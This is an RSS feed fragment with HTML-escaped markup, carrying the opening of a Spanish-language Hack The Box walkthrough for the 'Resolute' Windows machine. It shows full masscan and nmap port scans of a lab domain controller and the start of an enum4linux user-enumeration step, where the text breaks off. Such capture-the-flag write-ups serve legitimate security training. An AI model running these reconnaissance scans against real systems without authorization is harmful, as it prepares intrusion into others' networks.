        <media:content url="https://sckull.github.io/images/posts/htb/nest/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/nest/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Resolute</title>
        <link>https://sckull.github.io/posts/resolute/</link>
        <pubDate>Thu, 28 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 28 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/resolute/</guid>
        <description>Resolute es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Resolute es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Resolute&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.169&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y servicios con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.169 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0
Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-03 21:06:25 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 3269/tcp on 10.10.10.169                                  
Discovered open port 5985/tcp on 10.10.10.169                                  
Discovered open port 464/tcp on 10.10.10.169                                   
Discovered open port 65511/udp on 10.10.10.169                                 
Discovered open port 593/tcp on 10.10.10.169                                   
Discovered open port 49665/tcp on 10.10.10.169                                 
Discovered open port 3268/tcp on 10.10.10.169                                  
Discovered open port 49915/tcp on 10.10.10.169                                 
Discovered open port 389/tcp on 10.10.10.169                                   
Discovered open port 88/tcp on 10.10.10.169                                    
Discovered open port 49667/tcp on 10.10.10.169                                 
Discovered open port 56647/udp on 10.10.10.169                                 
Discovered open port 53/tcp on 10.10.10.169

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Jan  3 15:11:12 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.169&lt;/span&gt;
Warning: 10.10.10.169 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.169
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;63791&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1719&lt;/span&gt; filtered ports
PORT      STATE SERVICE      VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2020-01-03 21:24:08Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: megabank.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: MEGABANK&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: megabank.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
9389/tcp  open  adws?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  unknown
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49915/tcp open  msrpc        Microsoft Windows RPC
52015/tcp open  tcpwrapped
52105/tcp open  tcpwrapped
Service Info: Host: RESOLUTE&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 2h48m08s, deviation: 4h37m09s, median: 8m07s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard 6.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: Resolute
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: RESOLUTE&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Domain name: megabank.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Forest name: megabank.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FQDN: Resolute.megabank.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2020-01-03T13:25:11-08:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: &amp;lt;blank&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-01-03T21:25:14
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2020-01-03T20:29:32

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Jan  3 15:18:57 2020 -- 1 IP address (1 host up) scanned in 464.61 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;enum4linux&#34;&gt;ENUM4LINUX&lt;/h2&gt;
&lt;p&gt;Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;128
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;129
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;130
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;131
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;132
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;133
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;134
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;135
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;136
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;137
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;138
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;139
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;140
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;141
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;142
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;143
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;144
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;145
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;146
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;147
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;148
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;149
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;150
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;151
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;152
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;153
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;154
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;155
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;156
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;157
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;158
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;159
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;160
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;161
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;162
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;163
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;164
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;165
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;166
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;167
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;168
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;169
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;170
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;171
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;172
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;173
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;174
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;175
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;176
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;177
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;178
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;179
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;180
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;181
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;182
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;183
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;184
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;185
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;186
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;187
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;188
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;189
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;190
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;191
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;192
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;193
